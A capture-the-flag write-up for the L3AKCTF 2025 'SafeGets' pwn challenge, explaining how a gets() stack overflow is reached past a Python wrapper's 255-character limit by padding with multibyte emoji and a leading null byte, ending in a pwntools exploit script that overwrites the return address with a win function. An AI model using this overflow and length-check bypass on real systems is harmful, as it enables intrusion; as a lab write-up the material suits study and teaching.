+++
author = "Velobobo"
title = "L3AKCTF 2025 - SafeGets"
date = "2025-07-12"
description = ""
draft = false
slug = "l3ak-2025-safegets"
ctfs = ["L3AKCTF-2025"]
tags = [
    "bof",
    "ctf"
]
categories = [
    "pwn"
]

+++

# SafeGets – l3akCTF 2025

## Overview  
The original binary was rather simple using `gets()` to read data into buffer and then printing the reversed string of buffer via puts , it had a win  function too. it had no canary , no pie , nx on . so it was clear what we needed to do . but there was a wrapper.py which was first checking if our input is less than 255 bytes and then only executing the binary with out input.



## Code & wrapper.py  

wrapper.py
```python
import subprocess
import sys
 
BINARY = "./chall"
MAX_LEN = 0xff
 
# Get input from user
payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
if len(payload) > MAX_LEN:
    print("[-] Input too long!")
    sys.exit(1)
 
# Start the binary with pipes
proc = subprocess.Popen(
    [BINARY],
    stdin=subprocess.PIPE,
    stdout=sys.stdout,
    stderr=subprocess.PIPE
)
```

code
```c
undefined8 main(void)
 
{
  size_t sVar1;
  char buffer [259];
  char local_15;
  int local_14;
  ulong i;
 
  gets(buffer);
  sVar1 = strlen(buffer);
  local_14 = (int)sVar1;
  for (i = 0; i < (ulong)(long)(local_14 / 2); i = i + 1) {
    local_15 = buffer[(long)(local_14 + -1) - i];
    buffer[(long)(local_14 + -1) - i] = buffer[i];
    buffer[i] = local_15;
  }
  puts("Reversed string:");
  puts(buffer);
  return 0;
}
```

## Exploitation Plan  
If we don't consider wrapper.py then it was just buffer overflow and overwriting the return address to the win function. And also to bypass the reversing of our payload we can just add a null byte in front of our payload as strlen just checks the input till null byte and with this the reversing will not happen as it will think the len is 0 , and this input is also read with `read()` so it will continue to read even if it encounters a null byte. But the offset to the return address was more than 255 bytes , so wee somehow had to bypass wrapper.py  
so after a bit of searching i found out python's len treats emojis, Chinese characters etc which are in utf-8 encoding as 1 but in actual bytes they can reach many bytes.

{{< figure src="emoji.png" alt="emoji-bytes" width="500" >}}
 
so i just had to use a emoji as a garbage value to fill up the stack instead of normal characters , that would bypass the len check


## Exploit script  

```python
from pwn import *
 
binary='./chall'
elf = context.binary = ELF(binary, checksec=False)
 
#p=process(binary)
p=remote("34.45.81.67",16002)
p.recvuntil(b't (max 255 bytes):')
#gdb.attach(p)
payload=b'\x00'+("💀"*69).encode("utf-8") +b'AAA'+p64(0x40101a)+p64(0x401262)
p.sendline(payload)
 
p.interactive()
```

## Result  
{{< figure src="flag.png" alt="flag" width="500" >}}
